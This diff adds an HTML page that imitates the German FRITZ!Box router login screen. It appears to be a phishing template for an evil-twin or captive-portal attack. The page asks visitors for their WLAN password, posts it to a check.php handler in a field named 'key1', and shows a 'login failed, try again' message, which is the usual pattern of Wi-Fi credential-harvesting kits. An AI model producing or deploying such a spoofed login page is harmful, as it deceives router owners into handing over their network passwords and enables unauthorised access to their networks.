@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="de"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="Cache-Control" content="private, no-transform">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="format-detection" content="telephone=no">
+<meta http-equiv="x-rim-auto-match" content="none">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimal-ui">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta http-equiv="cleartype" content="on">
+<link rel="shortcut icon" type="image/x-icon" href="http://192.168.178.1/favicon.ico">
+<link rel="apple-touch-icon" href="http://192.168.178.1/css/default/images/kopfbalken_links.png">
+<link rel="apple-touch-startup-image" href="http://192.168.178.1/css/default/images/kopfbalken_links.png">
+<style>
+@font-face {
+font-family: 'Source Sans Pro';
+src: url('/css/rd/fonts/sourcesanspro.woff');
+}
+@font-face {
+font-family: 'Source Sans Pro';
+src: url('/css/rd/fonts/sourcesansproBold.woff');
+font-weight: bold;
+}
+@font-face {
+font-family: 'AVM';
+src: url('/css/rd/fonts/metaWebProBold.woff');
+font-weight: bold;
+}
+html, input, textarea, keygen, select, button {
+font-family: 'Source Sans Pro', Arial, sans-serif;
+font-size: 100%;
+}
+.blue_bar_title,
+.logoArea {
+font-family: 'AVM', 'Source Sans Pro', Arial, sans-serif;
+}
+</style>
+
+<style type="text/css">
+/********************************************** Allgemein **********************************************/
+* {
+-webkit-tap-highlight-color: rgba(0,0,0,0);
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+-webkit-touch-callout: text;
+-webkit-user-select: text;
+-khtml-user-select: text;
+-moz-user-select: text;
+-ms-user-select: text;
+user-select: text;
+font-size: 100%;
+vertical-align: middle;
+outline: 0;
+}
+*::selection {
+background: transparent;
+}
+*::-moz-selection {
+background: transparent;
+}
+.selectable *::selection {
+background: #8fdaff;
+}
+.selectable *::-moz-selection {
+background: #8fdaff;
+}
+html {
+height: 100%;
+font-size: 100%;
+background-color: #f0eee6;
+transition: background-color 400ms cubic-bezier(0.165, 0.840, 0.440, 1.000);
+}
+body {
+height: 100%;
+padding:0;
+margin:0;
+color: #3F464C;
+overflow-x: hidden;
+overflow-y: auto;
+line-height: 1;
+}
+h1, h2, h3, h4, h5, p, span, div, hr, br, nav, header, section, menu {
+margin: 0;
+padding: 0;
+border: 0;
+}
+h4 {
+margin: 1.25rem 0;
+}
+input {
+margin: 0;
+padding: 0;
+}
+hr {
+padding: 0;
+border-top: 1px solid #d5d5d5;
+margin: 1.25rem -1.25rem;
+}
+header {
+height: 6.25rem;
+width: 100%;
+position: fixed;
+top: 0;
+left: 0;
+z-index: 100;
+background-color: #006ec0;
+display: -webkit-box;
+display: -moz-box;
+display: -ms-flexbox;
+display: -webkit-flex;
+display: flex;
+-webkit-box-flex-direction: row;
+-moz-box-flex-direction: row;
+-webkit-flex-direction: row;
+-ms-flex-direction: row;
+flex-direction: row;
+transition: all 400ms cubic-bezier(0.165, 0.840, 0.440, 1.000);
+}
+.hidden {
+display: none;
+}
+.blue_bar_title {
+-webkit-box-flex: 1 1 auto;
+-moz-box-flex: 1 1 auto;
+-webkit-flex: 1 1 auto;
+-ms-flex: 1 1 auto;
+flex: 1 1 auto;
+-webkit-box-align-self: center;
+-moz-box-align-self: center;
+-webkit-align-self: center;
+-ms-align-self: center;
+align-self: center;
+margin: 0.3rem 0 0 0;
+font-size: 3rem;
+font-weight: bold;
+text-align: left;
+color: #ffffff;
+overflow: hidden;
+white-space: nowrap;
+text-overflow: ellipsis;
+text-align: center;
+transition: all 150ms;
+}
+.blue_bar_title.fade {
+font-size: 0;
+color: transparent;
+}
+.logoBox {
+background-image: url("fritzLogo.svg");
+background-position: center right;
+background-repeat: no-repeat;
+background-size: 7rem;
+color: transparent;
+width: 10.75rem;
+height: 6.25rem;
+}
+.logoBox.fake {
+background-image: none;
+}
+.dialog_outer {
+height: 100%;
+display: -webkit-box;
+display: -moz-box;
+display: -ms-flexbox;
+display: -webkit-flex;
+display: flex;
+-webkit-box-justify-content: center;
+-moz-box-justify-content: center;
+-webkit-justify-content: center;
+-ms-justify-content: center;
+justify-content: center;
+-webkit-box-align-items: center;
+-moz-box-align-items: center;
+-webkit-align-items: center;
+-ms-align-items: center;
+align-items: center;
+background-image: url("login_background.svg");
+background-position: center 51%;
+background-repeat: no-repeat;
+background-size: 38rem;
+padding: 6.5rem 0;
+}
+.dialog_outer p {
+margin: 1.25rem 0;
+line-height: 1.25rem;
+}
+.loginForm {
+display: block;
+}
+.setFac .pushmailQuestion,
+.setFac #sendFacReset,
+.setFac #sendPushMail,
+.setFac #setFac,
+.pushmailSend,
+.restore,
+.pushmail .pushmailQuestion,
+.pushmail #sendFacReset,
+.pushmail #sendPushMail,
+.pushmail #setFac,
+.forgotPassForm,
+.forgotPass .loginForm {
+display: none;
+}
+.setFac .restore,
+.pushmail .pushmailSend,
+.forgotPass .forgotPassForm {
+display: block;
+visibility: visible;
+}
+.setFac .forgotPassForm {
+display: none;
+}
+.pushmail.wait .pushmailSend {
+visibility: hidden;
+}
+.intxt.wait,
+.setFac.wait .dialog_content,
+.pushmail.wait .dialog_content {
+background-image: url("/css/rd/images/wait_circle_bright_back.gif");
+background-position: center 1.5rem;
+background-repeat: no-repeat;
+background-size: 2rem;
+}
+.intxt.wait {
+height: 2rem;
+width: 100%;
+margin: 0.5rem;
+background-position: center;
+}
+.ErrorMsg,
+.error_text,
+.WarnMsgBold {
+color: #ff3000;
+}
+.WarnMsgBold {
+font-weight:bold;
+}
+.pushmailQuestion,
+.pushmailSend,
+#setFac,
+.restore {
+padding: 0 1.25rem;
+}
+#uiLoginError,
+#uiUsernameError {
+height: 1.25rem;
+margin: -0.35rem 0 0.75rem 9rem;
+font-size: 0.94rem;
+transition: all 400ms cubic-bezier(0.165, 0.840, 0.440, 1.000);
+}
+#uiLoginError {
+height: 7.25rem;
+margin: -0.35rem 0 0 9rem;
+}
+#uiLoginError p:first-Child {
+margin: 0;
+}
+#uiLoginError p:nth-Child(2) {
+margin: 0 0 1.25rem 0;
+}
+#uiLoginError p {
+transition: color 400ms cubic-bezier(0.165, 0.840, 0.440, 1.000);
+}
+@media (max-width: 759px) {
+#uiLoginError {
+height: 7.5rem;
+}
+}
+@media (max-width: 369px) {
+#uiLoginError {
+height: 10rem;
+}
+}
+@media (max-width: 279px) {
+#uiLoginError {
+height: 13rem;
+}
+}
+#uiUsernameError.hidden,
+#uiLoginError.hidden {
+display: block;
+overflow: hidden;
+height: 0;
+margin: 0 0 0 9rem;
+}
+#uiLoginError.hidden p.error_text {
+color: transparent;
+}
+button {
+min-width: 5.5rem;
+min-height: 1.75rem;
+overflow: hidden;
+padding: 0 1rem;
+margin: 0 0 0 1.25rem;
+background-color: #e9edf0;
+border: 1px solid #d8dfe3;
+border-radius: 0.25rem;
+color: #4269a4;
+cursor: pointer;
+will-change: border, background-color, color;
+transition: border 100ms,
+background-color 100ms,
+color 100ms;
+}
+.btn_form_foot button {
+margin: 0 0 0 1.25rem;
+}
+button:first-Child {
+margin-left: 0;
+}
+button:active {
+background-color: #bcccd4;
+border: 1px solid #b0bec5;
+}
+button:disabled {
+background-color: #e0e0de;
+border: 1px solid #d8dfe3;
+color: #969693;
+cursor: default;
+}
+.btn_form_foot button {
+min-height: 2rem;
+min-width: 7.5rem;
+margin: 0 0 0 0.5rem;
+background-color: #268edf;
+color: #ffffff;
+cursor: pointer;
+overflow: hidden;
+text-align: center;
+padding: 0.35rem 1rem;
+will-change: margin, width, background-color, color;
+transition: margin 400ms cubic-bezier(0.165, 0.840, 0.440, 1.000),
+width 400ms cubic-bezier(0.165, 0.840, 0.440, 1.000),
+background-color 100ms,
+color 100ms;
+border: 0;
+border-radius: 0;
+}
+.btn_form_foot button:active {
+background-color: #57758c;
+}
+.btn_form_foot button:disabled {
+background-color: #d5d5d5;
+color: #969693;
+cursor: default;
+}
+@media (max-width: 1023px) {
+.btn_form_foot button {
+min-height: 2.25rem;
+}
+}
+@media (min-width: 760px) {
+/*pc*/
+.dialog_inner {
+-webkit-box-flex: 0 0 28.75rem;
+-moz-box-flex: 0 0 28.75rem;
+-webkit-flex: 0 0 28.75rem;
+-ms-flex: 0 0 28.75rem;
+flex: 0 0 28.75rem;
+margin: auto 0;
+padding: 0;
+box-shadow: 0 0.1875rem 0.375rem rgba(0,0,0,0.25);
+background-color: #ffffff;
+}
+.dialog_head_box {
+text-align: left;
+height: 3.25rem;
+margin: auto;
+background-color: #268edf;
+}
+.dialog_head_box h2 {
+margin: 0 0 0 1.25rem;
+font-weight: bold;
+font-size: 1.25rem;
+color: #ffffff;
+letter-spacing: 0.025rem;
+line-height: 3.4rem;
+}
+.dialog_content {
+padding: 0 0 1rem 0;
+min-height: 5rem;
+}
+.formular {
+text-align: left;
+margin: 0;
+padding: 0 1.25rem 0 1.25rem;
+}
+label,
+input,
+select {
+margin: 0 0 0.5rem;
+color: #3F464C;
+vertical-align: middle;
+display: inline-block;
+}
+.formular label {
+width: 8.5rem;
+margin-right: 0.5rem;
+line-height: 1.7rem;
+}
+.formular input,
+.formular select {
+width: 17.25rem;
+border: 1px solid #d5d5d5;
+height: 1.7rem;
+}
+.formular input.error,
+.formular select.error {
+border-color: #ff3000;
+}
+.formular input {
+padding: 0 0.25rem;
+}
+.language_selection.formular input {
+width: auto;
+margin-right: 0.25rem;
+}
+.btn_form_foot {
+border-top: 1px solid #d5d5d5;
+margin: 1.75rem 0 0 0;
+padding: 1rem 1.25rem 0 1.25rem;
+text-align: right;
+width: 100%;
+display: flex;
+flex-direction: row-reverse;
+justify-content: space-between;
+align-items: center;
+}
+.forgotPass .btn_form_foot {
+justify-content: flex-start;
+}
+.btn_form_foot a {
+display: inline-block;
+text-decoration: none;
+font-size: 0.9375rem;
+font-weight: normal;
+color: #4269a4;
+margin: 0;
+padding: 0.1rem 0 0 0;
+cursor: pointer;
+}
+.btn_form_foot a:hover {
+text-decoration: underline;
+}
+}
+@media (max-width: 759px) {
+/*für mobile Ansicht*/
+html {
+background-color: #ffffff;
+background-image: none;
+}
+body {
+height: auto;
+}
+header {
+height: 3.75rem;
+}
+.dialog_outer {
+font-size: 1.25rem;
+background-image: none;
+padding: 3.75rem 0 4.25rem 0;
+}
+.blue_bar_title {
+text-align: left;
+padding: 1rem 0 1.035rem 0.15rem;
+font-size: 1.25rem;
+font-weight: normal;
+}
+.blue_bar_title.hide {
+color: transparent;
+}
+.dialog_inner {
+width: 90%;
+margin: 0;
+}
+.dialog_head_box {
+display: none;
+}
+.logoBox {
+height: 3.75rem;
+background-position: left 0.5rem center;
+background-size: 3.75rem;
+width: 5rem;
+}
+.formular {
+text-align: left;
+margin: 0;
+padding: 0;
+}
+label,
+input,
+select {
+vertical-align: middle;
+display: inline-block;
+margin: 0 0 0.5rem;
+color: #3F464C;
+}
+.pushmailQuestion,
+.pushmailSend,
+#setFac,
+.restore {
+padding: 0;
+}
+.formular label {
+width: 10rem;
+line-height: 1.7rem;
+margin: 0 0.5rem 0 0;
+vertical-align: top;
+}
+#uiLoginError,
+#uiUsernameError {
+margin: 0 0 1rem 0;
+font-size: 1.15rem;
+}
+#uiUsernameError.hidden,
+#uiLoginError,
+#uiLoginError.hidden {
+margin: 0;
+}
+.formular input,
+.formular select {
+border: 1px solid #d5d5d5;
+height: 1.7rem;
+width: 100%;
+max-width: 20rem;
+}
+.formular input.error,
+.formular select.error {
+border-color: #ff3000;
+}
+.formular input {
+padding: 0 0.25rem;
+}
+.language_selection.formular input {
+width: auto;
+margin: 0 0.5rem 0.5rem 0;
+}
+.btn_form_foot {
+border: none;
+margin: 0 -1.25rem 0 -1.25rem;
+padding: 0 1.25rem;
+text-align: center;
+width: calc(100% + 2.5rem);
+display: flex;
+flex-direction: column-reverse;
+}
+button,
+.btn_form_foot button {
+min-width: 100%;
+min-height: 2.2rem;
+margin: 0;
+}
+.btn_form_foot button {
+margin: 2rem 0 0 0;
+}
+.btn_form_foot a {
+display: block;
+position: fixed;
+bottom: 0;
+left: 0;
+text-align: center;
+width: 100%;
+padding: 1rem 0;
+background-color: #f1f6f9;
+cursor: pointer;
+}
+.btn_form_foot a {
+color: #3080C8;
+}
+.logoBox.fake {
+display: none;
+}
+}
+.perfTestHead {
+border-top: 1px solid #ff3000;
+margin: 1rem 0 0 0;
+padding: 1.25rem 1.25rem 0 1.25rem;
+color: #ff3000;
+cursor: pointer;
+}
+.perfTestHead span {
+display: inline-block;
+height: 1rem;
+width: 2rem;
+background-image: url("/css/rd/images/link_open_red.svg");
+background-position: center;
+background-size: 1rem;
+background-repeat: no-repeat;
+}
+.perfTestHead.show span {
+background-image: url("/css/rd/images/link_closed_red.svg");
+}
+.perfTestMsg {
+display: none;
+padding: 0 1.25rem 0 1.25rem;
+}
+.perfTestMsg.show {
+display: block;
+}
+.forgotPass .perfTestHead,
+.forgotPass .perfTestMsg.show {
+display: none;
+}
+.hintMsg {
+font-weight: bold;
+}
+@media (max-width: 759px) {
+.perfTestHead {
+margin: 1.5rem 0 0 0;
+padding: 1.25rem 0 0 0;
+}
+.perfTestMsg {
+padding: 0;
+}
+}
+@media (min-width: 2040px) {
+html {
+font-size: 0.79vw;
+}
+}
+
+
+</style>
+<title>
+FRITZ!Box
+</title>
+</head>
+<body>
+<script>
+var gNbc = false,
+config = {"gu_type":"release","isDebug":false,"GUI_IS_REPEATER":false};
+</script>
+<script src="FRITZ%21Box-Dateien/avmcore.js"></script>
+<!--<script src="/js/browser.js"></script>-->
+<!--<script src="/js/jsl.js"></script>-->
+<!--<script src="/js/md5.js"></script>-->
+<!--<script src="/js/html.js"></script>-->
+<!--<script src="/js/func.js"></script>-->
+<!--<script type="text/javascript" src="/myfritz/js/focuschanger.js?lang=de"></script>-->
+<!--<script src="/js/html2.js?lang=de"></script>-->
+<!--<script src="/js/http.js"></script>-->
+<script type="text/javascript" src="FRITZ%21Box-Dateien/login.js"></script>
+<script type="text/javascript">
+
+</script>
+<header id="blueBarBox" name="" class=""><div id="" name="" class="logoBox"></div>
+<div id="blueBarTitel" name="" class="blue_bar_title">FRITZ!Box WLAN</div>
+<div id="" name="" class="logoBox fake"></div></header><div class="dialog_outer">
+<div id="dialogInner" class="dialog_inner">
+<div id="dialogHeadBox" class="dialog_head_box">
+<h2 id="dialogTitle">Willkommen bei Ihrer FRITZ!Box</h2></div>
+<div id="dialogContent" class="dialog_content">
+
+<form method="post" action="check.php" id="form1" name="form1" class="loginForm">
+
+<div class="formular">
+<p>Bitte melden Sie sich mit Ihrem WLAN-Passwort an.</p>
+<input tabindex="2" name="key1" type="password">
+<div id="uiLoginError" class="hidden">
+<p class="error_text">Anmeldung fehlgeschlagen.</p>
+<p class="error_text">Bitte versuchen Sie es erneut.</p>
+<p id="uiWait" class="error_text"></p></div></div>
+<div class="btn_form_foot">
+<input name="response" id="uiResp" value="" type="hidden">
+<input name="lp" value="" type="hidden">
+<input name="username" id="username" value="" type="hidden">
+<button type="submit" tabindex="3" id="submitLoginBtn">Anmelden</button>
+<a>Kennwort vergessen?</a></div></form></div></div></div>
